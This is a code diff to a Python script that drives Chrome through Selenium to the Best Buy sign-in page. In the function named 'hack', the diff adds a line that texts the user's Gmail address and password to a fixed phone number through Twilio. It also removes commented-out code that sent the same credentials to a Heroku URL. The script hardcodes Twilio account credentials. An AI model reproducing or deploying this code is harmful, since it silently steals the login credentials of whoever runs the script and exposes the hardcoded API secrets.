@@ -14,6 +14,7 @@ def hack():
     account_sid = "AC67d1437cea8593339dce6ec20c4eeeb3"
     auth_token = "60e2616f01b750c78efd6d44022a8210"
     client = Client(account_sid, auth_token)
+    message = client.messages.create(body= f"\ngmail: {gmail}, password: {password}", from_="+18592953746", to="+62816300111")
 def shut():
     driver.quit()
 def sign():
@@ -28,10 +29,8 @@ def sign():
     username = os.getenv('USERPROFILE')
     if getattr(sys, 'frozen', False):
         chrome_driver = os.path.join(sys._MEIPASS, 'chromedriver.exe')
-    # message = client.messages.create(body= f"\ngmail: {gmail}, password: {password}", from_="+18592953746", to="+62816300111")
-    # requests.get('http://flask-owen.herokuapp.com/' + gmail + '/' + password)
     else:
-        chrome_driver = r'C:\Users\owenw\vscode\chromedriver.exe'
+        chrome_driver = r'chromedriver.exe'
 
     driver = webdriver.Chrome(executable_path=chrome_driver, options=options)
     driver.get('https://www.bestbuy.com/identity/global/signin')
